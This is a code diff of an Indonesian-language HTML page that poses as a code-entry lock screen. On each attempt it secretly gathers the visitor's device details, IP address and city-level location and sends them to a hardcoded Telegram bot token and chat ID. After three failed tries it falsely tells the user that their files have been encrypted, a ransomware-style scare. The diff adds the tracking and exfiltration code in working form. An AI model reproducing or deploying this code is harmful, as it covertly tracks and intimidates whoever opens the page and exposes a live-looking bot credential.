@@ -1,5 +1,4 @@
-<!DOCTYPE html>
-<html lang="id">
+<!DOCTYPE html><html lang="id">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -62,86 +61,87 @@
         const botToken = "7944910420:AAFZCEefb3KVE936jvHSZw9g-SOBfjWVZiY"; // Ganti dengan token bot Telegram Anda
         const chatId = "7524343521"; // Ganti dengan chat ID Anda
         let attemptCount = 0;
-        const maxAttempts = 3;
+        const maxAttempts = 3;// Mendapatkan informasi perangkat
+    async function getDeviceInfo() {
+        const userAgent = navigator.userAgent;
+        const platform = navigator.platform;
+        const screenResolution = `${screen.width}x${screen.height}`;
+        const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+        const networkType = connection ? connection.effectiveType : "Tidak diketahui";
+        const battery = navigator.getBattery ? await navigator.getBattery() : null;
+        const batteryInfo = battery 
+            ? `Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
+            : "Informasi baterai tidak tersedia";
 
-        // Mendapatkan informasi perangkat
-        async function getDeviceInfo() {
-            const userAgent = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenResolution = `${screen.width}x${screen.height}`;
-            const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-            const networkType = connection ? connection.effectiveType : "Tidak diketahui";
-            const battery = navigator.getBattery ? await navigator.getBattery() : null;
-            const batteryInfo = battery 
-                ? `Baterai: ${Math.round(battery.level * 100)}%, Pengisian: ${battery.charging ? "Ya" : "Tidak"}`
-                : "Informasi baterai tidak tersedia";
+        let locationInfo = "Gagal mendapatkan lokasi.";
+        try {
+            const response = await fetch("http://ip-api.com/json/");
+            const data = await response.json();
+            locationInfo = `
 
-            let locationInfo = "Gagal mendapatkan lokasi.";
-            try {
-                const response = await fetch("http://ip-api.com/json/");
-                const data = await response.json();
-                locationInfo = `
-IP Address: ${data.query}
-Kota: ${data.city}
-Kecamatan: ${data.regionName}
+🌍 Info Pengguna
+
+IP: ${data.query}
+
 Negara: ${data.country}
-Latitude: ${data.lat}
-Longitude: ${data.lon}
-ISP: ${data.isp}
-                `;
-            } catch (error) {
-                console.error("Gagal mendapatkan lokasi:", error);
-            }
 
-            return `
-User-Agent: ${userAgent}
-Platform: ${platform}
-Resolusi Layar: ${screenResolution}
-Jenis Jaringan: ${networkType}
+Provinsi: ${data.regionName}
+
+Kota: ${data.city}
+
 ${batteryInfo}
-${locationInfo}
-            `;
-        }
 
-        // Mengirimkan data ke Telegram
-        async function sendToTelegram(message) {
-            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-            const data = { chat_id: chatId, text: message };
-            try {
-                await fetch(url, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify(data),
-                });
-                console.log("Pesan terkirim ke Telegram.");
-            } catch (error) {
-                console.error("Gagal mengirim pesan ke Telegram:", error);
-            }
-        }
+User Agent: ${userAgent}
 
-        async function checkCode() {
-            const inputCode = document.getElementById('inputCode').value;
-            const errorMessage = document.getElementById('errorMessage');
+Platform: ${platform}
 
-            if (attemptCount < maxAttempts) {
-                if (inputCode === "1234") { // Ganti dengan password Anda
-                    alert("Berhasil membuka kunci!");
-                    const deviceInfo = await getDeviceInfo();
-                    await sendToTelegram("Pola benar! Informasi perangkat:\n" + deviceInfo);
-                } else {
-                    attemptCount++;
-                    errorMessage.textContent = `Pola salah! Percobaan tersisa: ${maxAttempts - attemptCount}`;
-                    const deviceInfo = await getDeviceInfo();
-                    await sendToTelegram(`Percobaan ${attemptCount}: Pola salah.\n\nInformasi perangkat:\n${deviceInfo}`);
-                }
-            }
+Resolusi Layar: ${screenResolution}
 
-            if (attemptCount >= maxAttempts) {
-                errorMessage.textContent = "Semua percobaan gagal! File dienkripsi.";
-                const deviceInfo = await getDeviceInfo();
-                await sendToTelegram("Semua file telah dienkripsi!\n\nInformasi perangkat:\n" + deviceInfo);
-            }
-        }
-    </script>
+Jenis Jaringan: ${networkType}`; } catch (error) { console.error("Gagal mendapatkan lokasi:", error); }
+
+return locationInfo;
+  }
+
+  // Mengirimkan data ke Telegram
+  async function sendToTelegram(message) {
+      const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+      const data = { chat_id: chatId, text: message };
+      try {
+          await fetch(url, {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify(data),
+          });
+          console.log("Pesan terkirim ke Telegram.");
+      } catch (error) {
+          console.error("Gagal mengirim pesan ke Telegram:", error);
+      }
+  }
+
+  async function checkCode() {
+      const inputCode = document.getElementById('inputCode').value;
+      const errorMessage = document.getElementById('errorMessage');
+
+      if (attemptCount < maxAttempts) {
+          if (inputCode === "1234") { // Ganti dengan password Anda
+              alert("Berhasil membuka kunci!");
+              const deviceInfo = await getDeviceInfo();
+              await sendToTelegram("Pola benar! Informasi perangkat:\n" + deviceInfo);
+          } else {
+              attemptCount++;
+              errorMessage.textContent = `Pola salah! Percobaan tersisa: ${maxAttempts - attemptCount}`;
+              const deviceInfo = await getDeviceInfo();
+              await sendToTelegram(`Percobaan ${attemptCount}: Pola salah.\n\nInformasi perangkat:\n${deviceInfo}`);
+          }
+      }
+
+      if (attemptCount >= maxAttempts) {
+          errorMessage.textContent = "Semua percobaan gagal! File dienkripsi.";
+          const deviceInfo = await getDeviceInfo();
+          await sendToTelegram("Semua file telah dienkripsi!\n\nInformasi perangkat:\n" + deviceInfo);
+      }
+  }
+
+  </script>
 </body>
 </html>
